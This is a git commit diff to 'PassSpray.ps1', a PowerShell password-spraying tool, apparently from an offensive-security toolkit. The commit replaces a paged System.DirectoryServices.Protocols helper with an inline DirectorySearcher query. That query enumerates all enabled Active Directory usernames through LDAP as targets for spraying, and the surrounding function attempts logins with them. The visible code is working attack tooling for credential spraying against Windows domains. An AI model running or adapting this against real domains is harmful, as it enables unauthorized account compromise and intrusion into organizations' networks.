16bd74992e37880db75f3b8e5b5388e5a13f5254
Rob <61951374+Leo4j@users.noreply.github.com>
2023-11-30 18:56:12 +0000

    Update PassSpray.ps1

--- Tools/PassSpray.ps1
+++ Tools/PassSpray.ps1
@@ -38,18 +38,23 @@ function Invoke-PassSpray {
 			$DomainController = ($result | Where-Object { $_ -like '*svr hostname*' } | Select-Object -First 1).Split('=')[-1].Trim()
 	  	}
 	}
-	
-	$connection = Establish-LDAPSession -Domain $Domain -DomainController $DomainController
 
 	$AllUsers = @()
-	$AllUsers = Get-ADUsers -LdapConnection $connection -ADCompDomain $Domain
-	#$AllUsers = ($AllUsers | Out-String) -split "`n"
-	#$AllUsers = $AllUsers.Trim()
-	#$AllUsers = $AllUsers | Where-Object { $_ -ne "" }
+	$objSearcher = New-Object System.DirectoryServices.DirectorySearcher
+	if($Domain){
+		if($DomainController){
+			$TempDomainName = "DC=" + $Domain.Split(".")
+			$domainDN = $TempDomainName -replace " ", ",DC="
+			$ldapPath = "LDAP://$DomainController/$domainDN"
+			$objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
+		}
+		else{$objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain")}
+	}
+	else{$objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry}
+	$objSearcher.Filter = "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+	$objSearcher.PageSize = 1000
+	$AllUsers = $objSearcher.FindAll() | ForEach-Object { $_.properties.samaccountname }
 	$AllUsers = $AllUsers | Sort-Object -Unique
-	#$AllUsers = $AllUsers | Where-Object { $_ -and $_.trim() }
-	#$AllUsers = $AllUsers | Where-Object { $_ -ne "" }
-	$AllUsers = $AllUsers | Where-Object { $_ -ne "0" }
 	
 	$KeepTrack = $False
  	$LDAPPath = "LDAP://"
@@ -65,90 +70,4 @@ function Invoke-PassSpray {
 		} catch {}
 	}
  	if($KeepTrack -eq $False){Write-Output "[-] No Success"}
-}
-
-function Get-ADUsers {
-    param (
-        [string]$ADCompDomain,
-        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection  # The previously established connection
-    )
-
-    # Construct distinguished name for the domain.
-    $domainDistinguishedName = "DC=" + ($ADCompDomain -replace "\.", ",DC=")
-
-    # Set up an LDAP search request.
-    $ldapFilter = "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-    $attributesToLoad = @("samAccountName")
-
-    $allusers = @()
-
-    # Create a page request control
-    $pageRequest = New-Object System.DirectoryServices.Protocols.PageResultRequestControl(1000)
-    
-    do {
-        $searchRequest = New-Object System.DirectoryServices.Protocols.SearchRequest(
-            $domainDistinguishedName,     # Base DN
-            $ldapFilter,                  # LDAP filter
-            [System.DirectoryServices.Protocols.SearchScope]::Subtree,
-            $attributesToLoad             # Attributes to retrieve
-        )
-
-        # Add the page request control to the search request.
-        $searchRequest.Controls.Add($pageRequest)
-        
-        # Perform the search using the provided LdapConnection.
-        $searchResponse = $LdapConnection.SendRequest($searchRequest)
-
-        # Check for a page response control and update the cookie for the next request.
-        $pageResponse = $searchResponse.Controls | Where-Object { $_ -is [System.DirectoryServices.Protocols.PageResultResponseControl] }
-
-        if ($pageResponse) {
-            $pageRequest.Cookie = $pageResponse.Cookie
-        }
-
-        # Parse the results.
-        foreach ($entry in $searchResponse.Entries) {
-	    if ($entry.Attributes["samAccountName"] -and $entry.Attributes["samAccountName"].Count -gt 0) {
-            	$allusers += $entry.Attributes["samAccountName"][0]
-	    }
-        }
-
-    } while ($pageRequest.Cookie.Length -ne 0)
-	
-	foreach($usr in $allusers){
-		Write-Output "$usr"
-	}
-}
-
-function Establish-LDAPSession {
-    param (
-        [string]$Domain,
-        [string]$DomainController
-    )
-
-    # If the DomainController parameter is just a name (not FQDN), append the domain to it.
-    if ($DomainController -notlike "*.*") {
-        $DomainController = "$DomainController.$Domain"
-    }
-
-    # Define LDAP parameters
-    $ldapServer = $DomainController
-    $ldapPort = 389 # Use 636 for LDAPS (SSL)
-
-    # Load necessary assembly
-    Add-Type -AssemblyName "System.DirectoryServices.Protocols"
-
-    # Create LDAP directory identifier
-    $identifier = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($ldapServer, $ldapPort)
-
-    # Establish LDAP connection as current user
-    $ldapConnection = New-Object System.DirectoryServices.Protocols.LdapConnection($identifier)
-
-    # Use Negotiate (Kerberos or NTLM) for authentication
-    $ldapConnection.AuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate
-
-    # Bind (establish connection)
-    $ldapConnection.Bind()  # Bind as the current user
-
-    return $ldapConnection
 }
